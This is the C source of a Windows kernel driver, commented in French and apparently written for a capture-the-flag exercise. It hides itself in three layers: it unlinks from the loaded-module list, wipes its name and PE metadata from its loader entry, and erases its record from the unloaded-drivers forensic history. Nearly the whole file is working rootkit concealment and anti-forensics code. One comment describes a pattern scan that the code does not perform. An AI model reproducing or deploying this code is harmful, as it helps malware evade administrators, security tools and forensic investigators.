#include "driver.h"

// ---------------------------------------------------------------------------
// État global pour restauration au déchargement
// ---------------------------------------------------------------------------
static PLDR_DATA_TABLE_ENTRY g_ModuleEntry = NULL;
static PLIST_ENTRY           g_SavedFlink  = NULL;
static PLIST_ENTRY           g_SavedBlink  = NULL;

// ---------------------------------------------------------------------------
// Couche 1 : retrait de PsLoadedModuleList
//
// C'est la liste parcourue par driverquery, EnumDeviceDrivers (WinAPI),
// Process Hacker (menu Drivers), et WinDbg "lm".
// ---------------------------------------------------------------------------
VOID HideFromLoadedList(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    g_ModuleEntry = entry;
    g_SavedFlink  = entry->InLoadOrderLinks.Flink;
    g_SavedBlink  = entry->InLoadOrderLinks.Blink;

    RemoveEntryList(&entry->InLoadOrderLinks);
    InitializeListHead(&entry->InLoadOrderLinks);

    DbgPrint("[CTF] Couche 1 : retiré de PsLoadedModuleList\n");
}

// ---------------------------------------------------------------------------
// Couche 2 : effacement des champs identifiants dans LDR_DATA_TABLE_ENTRY
//
// Même si un adversaire fait un scan mémoire brut (ex: cherche la structure
// à partir de la base du module), les champs nom/timestamp/checksum seront
// vides. Outil visé : WinDbg "!drvobj", mémoire brute via ReadVirtualMemory.
// ---------------------------------------------------------------------------
VOID ObfuscateLdrEntry(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    // Effacer les noms dans les buffers (la mémoire est toujours là,
    // mais les chaînes ne sont plus lisibles)
    if (entry->FullDllName.Buffer && entry->FullDllName.Length > 0) {
        RtlSecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
        entry->FullDllName.Length        = 0;
        entry->FullDllName.MaximumLength = 0;
    }
    if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
        RtlSecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
        entry->BaseDllName.Length        = 0;
        entry->BaseDllName.MaximumLength = 0;
    }

    // Effacer les métadonnées PE qui permettent l'identification
    // (cherchées par PiDDBCacheTable et outils d'analyse)
    entry->TimeDateStamp = 0;
    entry->CheckSum      = 0;

    DbgPrint("[CTF] Couche 2 : noms et métadonnées PE effacés\n");
}

// ---------------------------------------------------------------------------
// Couche 3 : nettoyage de MmUnloadedDrivers
//
// Windows conserve un historique circulaire des 50 derniers drivers déchargés
// (nom + plage d'adresses + timestamp). Utilisé par les outils forensics pour
// retrouver un driver qui a été chargé puis déchargé.
// On cherche le tableau par pattern scan depuis ntoskrnl, puis on efface
// toute entrée qui correspond à notre plage d'adresses.
// ---------------------------------------------------------------------------
VOID CleanMmUnloadedDrivers(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING mmUnloadedName = RTL_CONSTANT_STRING(L"MmUnloadedDrivers");
    UNICODE_STRING mmLastName     = RTL_CONSTANT_STRING(L"MmLastUnloadedDriver");

    PMM_UNLOADED_DRIVER pTable =
        (PMM_UNLOADED_DRIVER)MmGetSystemRoutineAddress(&mmUnloadedName);
    PULONG pLast =
        (PULONG)MmGetSystemRoutineAddress(&mmLastName);

    if (!pTable || !pLast) {
        // MmUnloadedDrivers n'est pas exporté sur toutes les versions.
        // Dans ce cas on passe silencieusement.
        DbgPrint("[CTF] Couche 3 : MmUnloadedDrivers non trouvé (non exporté)\n");
        return;
    }

    PVOID driverStart = DriverObject->DriverStart;
    PVOID driverEnd   = (PVOID)((ULONG_PTR)driverStart + DriverObject->DriverSize);

    for (ULONG i = 0; i < MM_UNLOADED_DRIVERS_SIZE; i++) {
        if (pTable[i].ModuleStart >= driverStart &&
            pTable[i].ModuleStart <  driverEnd)
        {
            // Effacer le nom (pointeur vers pool — on laisse le pool intact)
            if (pTable[i].Name.Buffer) {
                RtlSecureZeroMemory(pTable[i].Name.Buffer, pTable[i].Name.Length);
                pTable[i].Name.Length        = 0;
                pTable[i].Name.MaximumLength = 0;
                pTable[i].Name.Buffer        = NULL;
            }
            pTable[i].ModuleStart = NULL;
            pTable[i].ModuleEnd   = NULL;
            pTable[i].UnloadTime  = 0;
        }
    }

    DbgPrint("[CTF] Couche 3 : MmUnloadedDrivers nettoyé\n");
}

// ---------------------------------------------------------------------------
// Restauration avant déchargement (obligatoire pour éviter BSOD)
// ---------------------------------------------------------------------------
VOID RestoreSelf(VOID)
{
    if (!g_ModuleEntry || !g_SavedBlink) return;

    g_ModuleEntry->InLoadOrderLinks.Flink = g_SavedBlink->Flink;
    g_ModuleEntry->InLoadOrderLinks.Blink = g_SavedBlink;
    g_SavedBlink->Flink->Blink = &g_ModuleEntry->InLoadOrderLinks;
    g_SavedBlink->Flink        = &g_ModuleEntry->InLoadOrderLinks;

    g_ModuleEntry = NULL;
    DbgPrint("[CTF] Entrée restaurée dans PsLoadedModuleList\n");
}

// ---------------------------------------------------------------------------
// DriverUnload / DriverEntry
// ---------------------------------------------------------------------------
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    CleanMmUnloadedDrivers(DriverObject);
    RestoreSelf();
    DbgPrint("[CTF] Driver déchargé\n");
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[CTF] Chargement — application des couches de dissimulation...\n");

    HideFromLoadedList(DriverObject);  // Couche 1
    ObfuscateLdrEntry(DriverObject);   // Couche 2
    // Couche 3 (MmUnloadedDrivers) appliquée au déchargement

    DbgPrint("[CTF] Dissimulation terminée\n");
    return STATUS_SUCCESS;
}
